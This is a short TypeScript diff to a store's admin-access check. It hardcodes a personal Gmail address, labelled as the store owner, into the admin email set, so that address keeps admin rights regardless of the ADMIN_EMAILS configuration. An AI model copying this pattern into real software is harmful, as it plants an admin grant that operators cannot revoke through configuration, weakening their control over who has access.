@@ -7,13 +7,17 @@ export type AdminAccess =
   | { authorized: true; userId: string; email: string }
   | { authorized: false; status: 401 | 403 | 503 };
 
+const storeOwnerEmail = 'taylorgrammm@gmail.com';
+
 function configuredAdminEmails() {
-  return new Set(
+  const emails = new Set(
     (process.env.ADMIN_EMAILS ?? '')
       .split(',')
       .map((email) => email.trim().toLowerCase())
       .filter(Boolean)
   );
+  emails.add(storeOwnerEmail);
+  return emails;
 }
 
 export async function verifyStoreAdmin(): Promise<AdminAccess> {
